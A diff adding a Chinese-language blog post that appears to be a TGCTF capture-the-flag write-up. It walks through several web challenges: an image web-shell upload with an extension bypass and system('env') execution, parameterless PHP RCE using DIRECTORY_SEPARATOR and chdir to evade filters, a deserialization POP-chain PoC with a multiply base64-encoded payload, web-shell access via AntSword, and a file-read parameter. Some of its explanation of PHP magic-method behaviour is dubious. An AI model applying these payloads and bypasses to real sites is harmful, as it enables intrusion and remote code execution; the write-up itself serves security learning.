@@ -1,0 +1,135 @@
+<h1 id="TGCTF"><a href="#TGCTF" class="headerlink" title="TGCTF"></a>TGCTF</h1><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a>(ez)upload</h2><p>上传一个图片马 抓包   通过  &#x2F;.  绕过</p>
+<p>在upload.php.bak里我们可以看到源码</p>
+<p><img src="/../picture/image-20250413200332910.png" alt="image-20250413200332910"></p>
+<p><img src="/../picture/image-20250413200513656.png" alt="image-20250413200513656"></p>
+<p><img src="/../picture/image-20250413200523834.png" alt="image-20250413200523834"></p>
+<p>上传成功  访问uploads&#x2F;shell.php</p>
+<p>执行命令    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=system(&#x27;env&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413200800976.png" alt="image-20250413200800976"></p>
+<h2 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a>AAA偷渡阴平</h2><p><img src="/../picture/image-20250413200900856.png" alt="image-20250413200900856"></p>
+<p>可以通过无参rce读取</p>
+<p>要列出根目录，可以利用 <strong>PHP 的预定义常量 <code>DIRECTORY_SEPARATOR</code></strong> 绕过对斜杠 <code>/</code> 的过滤。</p>
+<p><strong>方法：使用 <code>DIRECTORY_SEPARATOR</code> 常量</strong></p>
+<p>PHP 的 <code>DIRECTORY_SEPARATOR</code> 是一个预定义常量，在 Linux 系统中值为 <code>/</code>。通过该常量可以构造根目录的路径，而无需直接使用被过滤的斜杠。</p>
+<p>所以我们可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(DIRECTORY_SEPARATOR));</span><br></pre></td></tr></table></figure>
+
+<p>来列出根目录   发现了  flag文件</p>
+<p><img src="/../picture/image-20250413201353328.png" alt="image-20250413201353328"></p>
+<p>读取flag</p>
+<p><strong>方法：使用 <code>chdir</code> 切换目录</strong></p>
+<p>PHP 的 <code>chdir</code> 函数可以切换当前工作目录。结合 <code>DIRECTORY_SEPARATOR</code>（值为 <code>/</code>），无需使用 <code>.</code> 拼接路径即可访问根目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(DIRECTORY_SEPARATOR);readfile(flag);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413201714432.png" alt="image-20250413201714432"></p>
+<h3 id="关键点解释："><a href="#关键点解释：" class="headerlink" title="关键点解释："></a>关键点解释：</h3><ol>
+<li><strong>切换目录到根目录</strong>：<ul>
+<li><code>chdir(DIRECTORY_SEPARATOR)</code> 将当前工作目录切换到根目录 <code>/</code>。</li>
+<li><code>DIRECTORY_SEPARATOR</code> 是 PHP 预定义常量，值为 <code>/</code>，绕过对斜杠的直接使用。</li>
+</ul>
+</li>
+<li><strong>直接读取文件</strong>：<ul>
+<li><code>readfile(flag)</code> 会从当前目录（根目录）读取 <code>flag</code> 文件。</li>
+<li><code>flag</code> 作为未定义常量，PHP 自动转为字符串 <code>&#39;flag&#39;</code>。</li>
+</ul>
+</li>
+<li><strong>绕过过滤的字符</strong>：<ul>
+<li>所有字符均为字母、下划线、括号或分号，符合过滤规则。</li>
+</ul>
+</li>
+</ol>
+<h3 id="绕过-过滤的核心技巧："><a href="#绕过-过滤的核心技巧：" class="headerlink" title="绕过 . 过滤的核心技巧："></a>绕过 <code>.</code> 过滤的核心技巧：</h3><ul>
+<li><strong>目录切换代替路径拼接</strong>：通过 <code>chdir</code> 直接进入根目录，避免使用 <code>.</code> 拼接路径。</li>
+<li><strong>预定义常量</strong>：<code>DIRECTORY_SEPARATOR</code> 提供 <code>/</code>，绕过斜杠过滤。</li>
+<li><strong>分号分隔语句</strong>：允许在同一行执行多条命令。</li>
+</ul>
+<h2 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h2><p>访问  robots.txt   发现&#x2F;class.php  继续访问  进入反序列化</p>
+<p><img src="/../picture/image-20250413202007537.png" alt="image-20250413202007537"></p>
+<p>poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class yesterday &#123;</span><br><span class="line"></span><br><span class="line">  public $study;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class today &#123;</span><br><span class="line"></span><br><span class="line">  public $doing;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class tommoraw &#123;</span><br><span class="line"></span><br><span class="line">  public $good;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class future &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yesterday = new yesterday();</span><br><span class="line"></span><br><span class="line">$today = new today();</span><br><span class="line"></span><br><span class="line">$future = new future();</span><br><span class="line"></span><br><span class="line">$today-&gt;doing = $future;</span><br><span class="line"></span><br><span class="line">$yesterday-&gt;study = $today;</span><br><span class="line"></span><br><span class="line">$serialized = serialize($yesterday);</span><br><span class="line"></span><br><span class="line">$encoded = base64_encode(base64_encode(base64_encode(base64_encode(base64_encode($serialized)))));</span><br><span class="line"></span><br><span class="line">echo serialize($encoded);</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么原利用链能触发-toString？"><a href="#为什么原利用链能触发-toString？" class="headerlink" title="为什么原利用链能触发 __toString？"></a><strong>为什么原利用链能触发 <code>__toString</code>？</strong></h3><ul>
+<li><strong>链式调用</strong>：<ul>
+<li><code>yesterday::__destruct</code> ➔ 调用 <code>$this-&gt;study-&gt;hard()</code>。</li>
+<li>由于 <code>study</code> 是 <code>today</code> 对象且 <code>today</code> 没有 <code>hard</code> 方法，触发 <code>today::__call</code>。</li>
+<li>在 <code>today::__call</code> 中，执行 <code>return $this-&gt;doing-&gt;better</code>。</li>
+<li>由于 <code>doing</code> 是 <code>future</code> 对象且 <code>better</code> 属性不存在，PHP会尝试将 <code>future</code> 对象隐式转换为字符串（触发 <code>__toString</code>）。</li>
+</ul>
+</li>
+<li><strong>关键逻辑</strong>：<ul>
+<li><strong><code>$this-&gt;doing-&gt;better</code> 的访问</strong>：<ul>
+<li>由于 <code>better</code> 属性不存在，PHP会尝试调用 <code>future::__get</code>。</li>
+<li>但 <code>future</code> 类没有定义 <code>__get</code> 方法，导致PHP抛出错误。</li>
+<li>在错误处理过程中，PHP可能会尝试将 <code>future</code> 对象转换为字符串（例如输出错误信息），从而触发 <code>future::__toString</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong><code>return $this-&gt;doing-&gt;better</code></strong>：</p>
+<ul>
+<li>触发 <code>__get</code>（如果属性不存在）。</li>
+<li>若 <code>__get</code> 未定义，PHP尝试将对象转换为字符串（触发 <code>__toString</code>）</li>
+<li></li>
+</ul>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NsWlVTbUZXUlRWUFZHMXpNVlpYU1hsaVIzQk9UVlZzTkZZeWRHOWpiVVpXVDBoa1VGSkdjRkJXYTJNMVkwWndSbGw2Vm1oTlYzaGFXVlJLYzFWSFJuSldWRXBoVmtVMVQxUnRjekZXVjBsNVlrZEdVMlZ0ZUROWFZ6QjRZVzFHVms5SVpGQlNSbkJRV1Zjd05XTkdaSFJPVm1ST1VqRktXbFV5TVRSVGJVWjBUMVJPVlUxcVZYZFVNV1JoVjFVeFJVMUVNRDA9.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250413203223565.png" alt="image-20250413203223565"></p>
+<p>然后post  wow执行命令就可以了</p>
+<p><img src="/../picture/image-20250413203305448.png" alt="image-20250413203305448"></p>
+<p><img src="/../picture/image-20250413203327303.png" alt="image-20250413203327303"></p>
+<h3 id="为什么不加-php也可以成功执行命令？"><a href="#为什么不加-php也可以成功执行命令？" class="headerlink" title="为什么不加.php也可以成功执行命令？"></a>为什么不加.php也可以成功执行命令？</h3><p>在提供的代码中，通过 <code>substr($_GET[&#39;filename&#39;],0,-4)</code> 截取输入参数的前 N-4 个字符后进行反序列化。即使不添加 <code>.php</code> 后缀也能成功触发漏洞，原因如下：</p>
+<hr>
+<h4 id="关键原因分析"><a href="#关键原因分析" class="headerlink" title="关键原因分析"></a><strong>关键原因分析</strong></h4><ol>
+<li><p><strong>Base64 编码的容错性</strong>：</p>
+<ul>
+<li>Base64 编码每次处理 <strong>3 字节</strong> 的原始数据，生成 <strong>4 字节</strong> 的编码结果。</li>
+<li>如果原始数据长度不足 3 的倍数，会添加 <code>=</code> 作为填充字符。</li>
+<li><strong>多次编码后的数据末尾可能天然存在填充字符（如 <code>====</code>）</strong>，截断后仍能正确解码。</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原始数据 → Base64 → Base64 → Base64 → Base64 → Base64 → 最终编码字符串（可能含填充字符）</span><br></pre></td></tr></table></figure>
+
+<p>若最终编码字符串末尾为 <code>XXXX====</code>，截断最后 4 字符（<code>====</code>）后，剩余部分仍可正确解码。</p>
+</li>
+<li><p><strong>PHP 的自动填充处理</strong>：</p>
+<ul>
+<li>PHP 的 <code>base64_decode</code> 函数会自动忽略末尾的无效字符（如多余填充符号）。</li>
+<li>即使截断导致部分填充字符丢失，解码时仍能通过自动补全还原数据。</li>
+</ul>
+</li>
+<li><p><strong>攻击场景验证</strong>：</p>
+<ul>
+<li><p>若五次编码后的字符串本身以 <code>====</code> 结尾，提交 <code>filename=XXXX</code>（不添加 <code>.php</code>）时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(&quot;XXXX&quot;, 0, -4) → &quot;&quot;  // 截断后为空，无法触发漏洞</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>但若五次编码后的字符串长度为 <strong>N+4</strong>，且末尾 4 字符为有效编码（非填充字符），则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(&quot;XXXXYYYY&quot;, 0, -4) → &quot;XXXX&quot;  // 有效截断，可解码</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>此时无需后缀也能触发漏洞。</p>
+</li>
+</ol>
+<hr>
+<h4 id="成功利用的条件"><a href="#成功利用的条件" class="headerlink" title="成功利用的条件"></a><strong>成功利用的条件</strong></h4><ul>
+<li><strong>编码后的字符串长度需适配</strong>：<br>五次 Base64 编码后的总长度需满足 <code>(原始长度 + 填充) % 4 == 0</code>，确保截断后仍能正确解码。</li>
+<li><strong>末尾字符非关键数据</strong>：<br>截断的 4 字符需为填充或冗余数据，不影响反序列化结构。</li>
+</ul>
+<p>不加 <code>.php</code> 后缀仍能成功，是因为 <strong>五次编码后的字符串末尾天然包含 4 个冗余字符（如填充符号）</strong>，截断后不影响解码逻辑。这一特性使得攻击者无需强制添加后缀即可完成利用。实际攻击中需确保编码后的字符串结构适配截断操作。</p>
+<h2 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a>火眼辩魑魅</h2><p>访问robots.txt</p>
+<p><img src="/../picture/image-20250413204421130.png" alt="image-20250413204421130"></p>
+<p>利用的是通过tgshell.php的漏洞</p>
+<p><img src="/../picture/image-20250413204536584.png" alt="image-20250413204536584"></p>
+<p>因为他写了post shell吗  然后试着传参发现有waf</p>
+<p>这里可以直接通过antsword连接  然后在根目录里找到flag</p>
+<p><img src="/../picture/image-20250413204715286.png" alt="image-20250413204715286"></p>
+<p><img src="/../picture/image-20250413204749047.png" alt="image-20250413204749047"></p>
+<h2 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a>直面天命</h2><p>查看源代码发现hint  路由</p>
+<p><img src="/../picture/image-20250413204930583.png" alt="image-20250413204930583"></p>
+<p>这里的路由  应该可以爆破出来(我看的hint  没有爆破www)访问   &#x2F;aazz</p>
+<p><img src="/../picture/image-20250413205043901.png" alt="image-20250413205043901"></p>
+<p>然后这里通过抓包可以发现一个filename参数   这个是可以用来进行文件读取的   直接传?filename&#x3D;flag  就能读取</p>
+<p><img src="/../picture/image-20250413205127066.png" alt="image-20250413205127066"></p>
+<p><img src="/../picture/image-20250413205217665.png" alt="image-20250413205217665"></p>
